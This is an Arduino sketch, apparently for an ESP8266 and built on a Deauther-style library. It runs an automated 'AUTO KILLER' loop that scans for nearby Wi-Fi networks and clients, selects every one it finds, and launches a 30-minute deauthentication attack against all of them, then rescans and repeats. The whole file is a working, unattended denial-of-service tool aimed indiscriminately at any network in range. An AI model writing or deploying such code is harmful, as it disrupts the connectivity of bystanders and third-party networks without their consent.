#include "A_config.h"
#include "Arduino.h"
#include "Attack.h"
#include "EEPROMHelper.h"
#include "Names.h"
#include "SSIDs.h"
#include "Scan.h"
#include "functions.h"
#include "language.h"
#include "led.h"
#include "oui.h"
#include "settings.h"
#include "wifi.h"

// Globals
Names names;
SSIDs ssids;
Accesspoints accesspoints;
Stations stations;
Scan scan;
Attack attack;

uint32_t currentTime = 0;
bool isAttacking = false;
uint32_t attackStartTime = 0;

// Configuration
#define AUTO_SCAN_TIME 15000   // 15 seconds
#define AUTO_ATTACK_TIME 1800000 // 30 minutes
#define PRE_ATTACK_GLOW_TIME 1500 // 1.5 seconds solid LED before attack

void setup() {
  Serial.begin(115200);
  Serial.println("\nILA AUTO KILLER STARTING...");

  // Filesystem
  LittleFS.begin();
  EEPROMHelper::begin(EEPROM_SIZE);
  settings::load(); // Load random settings if any
  // Ensure LED control is enabled even if older EEPROM settings disabled it.
  led_settings_t ledSettings = settings::getLEDSettings();
  if (!ledSettings.enabled) {
    ledSettings.enabled = true;
    settings::setLEDSettings(ledSettings);
    settings::save(true);
  }

  // Subsystems
  wifi::begin();
  wifi_set_promiscuous_rx_cb(
      [](uint8_t *buf, uint16_t len) { scan.sniffer(buf, len); });

  led::setup();
  led::setMode(IDLE);

  Serial.println("Starting Initial Scan...");
  scan.start(SCAN_MODE_ALL, AUTO_SCAN_TIME, SCAN_MODE_OFF, 0, true, 0);
  led::setMode(SCAN);
}

void loop() {
  currentTime = millis();

  // Updates
  led::update();
  wifi::update();
  attack.update();
  scan.update();

  // State Machine
  if (isAttacking) {
    // We are in Attack Mode
    if (currentTime - attackStartTime > AUTO_ATTACK_TIME) {
      Serial.println("Attack Finished. Switching to Scan.");
      attack.stop();
      isAttacking = false;

      // Start Scan
      scan.start(SCAN_MODE_ALL, AUTO_SCAN_TIME, SCAN_MODE_OFF, 0, true, 0);
      led::setMode(SCAN);
    }
  } else {
    // We are in Scan Mode (or Idle)
    if (!scan.isScanning()) {
      // Scan just finished
      Serial.println("Scan Finished. Selecting Targets...");

      // Select Everything
      accesspoints.selectAll();
      stations.selectAll();

      int apCount = accesspoints.selected();
      int stCount = stations.selected();
      Serial.printf("Targets: %d APs, %d Stations\n", apCount, stCount);

      if (apCount > 0 || stCount > 0) {
        Serial.println("Starting Attack...");
        uint16_t attackTargetCount = apCount + stCount;
        led::setMode(IDLE, true);
        delay(PRE_ATTACK_GLOW_TIME);
        // beacon=false, deauth=true, deauthAll=true, probe=false, output=true,
        // timeout=0 (manual stop)
        attack.start(false, true, true, false, true, AUTO_ATTACK_TIME + 5000);
        led::startAttackIndicator(attackTargetCount);
        isAttacking = true;
        attackStartTime = currentTime;
        led::setMode(ATTACK);
      } else {
        Serial.println("No targets found. Rescanning...");
        scan.start(SCAN_MODE_ALL, AUTO_SCAN_TIME, SCAN_MODE_OFF, 0, true, 0);
        led::setMode(SCAN);
      }
    }
  }
}
